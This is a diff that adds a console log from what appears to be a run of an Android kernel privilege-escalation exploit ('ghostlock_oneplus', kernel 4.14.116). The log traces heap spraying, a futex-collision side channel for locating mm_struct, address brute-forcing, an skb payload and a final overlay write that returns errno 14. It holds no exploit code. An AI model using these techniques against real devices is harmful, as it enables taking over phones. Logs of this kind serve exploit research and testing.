@@ -1,0 +1,34 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffff8002f640b0
+[32m[+] [0mstartup context pid=6810 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=6810 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=6810 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=6810 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0m=== W1c: perf unblock === target=0xffffff8002f421e8 mode=1
+[33m[*] [0m[T+4ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007e0486a0c8
+[33m[*] [0m  0000006e03fecd60[33m[*] [0m  0000006e0403bfd8[33m[*] [0m  0000006e04413e98[33m[*] [0m  0000006e04461108[33m[*] [0m  0000006e049fedf0[33m[*] [0m  0000006e04b548a0[33m[*] [0m  0000006e04bc1c08[33m[*] [0m  0000006e04c11e88[33m[*] [0m  0000006e04d146a0[33m[*] [0m  0000006e04df2d90[33m[*] [0m  0000006e05240000[33m[*] [0m  0000006e05301608[33m[*] [0m  0000006e05323718[33m[*] [0m  0000006e0535c8e0[33m[*] [0m  0000006e053c4c20[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=1 best=1[33m[*] [0mKernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff80c0004ec0
+[33m[*] [0m[probe] base=ffffff80c0000000 payload_mode=0 entering skb payload[33m[*] [0m[p5] prepare_skb_payload returned ok[33m[*] [0m[p4] skb payload built, reclaim setup[33m[*] [0mdone
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+3611ms]   heap spray done
+[33m[*] [0mpvm overlay: target=ffffff8002f421e8 value=0000000000000000 lock=ffffff80c0000000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=14
